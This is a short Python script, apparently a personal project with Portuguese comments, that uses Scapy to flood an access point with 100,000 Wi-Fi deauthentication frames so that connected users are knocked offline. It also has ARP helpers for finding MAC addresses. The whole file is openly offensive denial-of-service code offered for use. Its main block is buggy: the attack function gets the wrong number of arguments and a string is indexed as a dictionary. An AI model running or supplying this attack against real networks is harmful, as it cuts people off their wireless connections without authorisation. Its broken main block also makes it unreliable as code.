from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.layers.l2 import ARP
import scapy.all as scapy 


def disconnect_user(mac_address, access_point,interface): 
	packet = RadioTap() / Dot11(addr1=mac_address, 
								addr2=access_point, 
			addr3=access_point) / Dot11Deauth(reason = 7) 
	sendp(packet, inter=0.01, 
		count=100000, iface="Wi-Fi 2", 
		verbose=1) 


def get_mac_address(ip_address): 
	arp_request = ARP(pdst=ip_address) 
	arp_response = sr1(arp_request, 
					timeout=1, verbose=False) 
	if arp_response is not None: 
		return arp_response.hwsrc 
	else: 
		return None
	


def getting_interface(ipaddress): 
	for interface in ifaces.values(): 
		if interface.ip == ipaddress: 
			return {"name":interface.name, 
					"mac":interface.mac} 

	
if __name__ == '__main__': 

	router_ip =  "192.100.1.1"
	interface = "Wi-Fi 2" 
	mac_address_access_point ="00:00:00:00:00:00" 

	
	print("MAC Address do modem : ", 
		mac_address_access_point) 
	
	print("começando o ataque agora ..... : ", mac_address_access_point) 
	disconnect_user( 
		mac_address_access_point,interface['name']) 
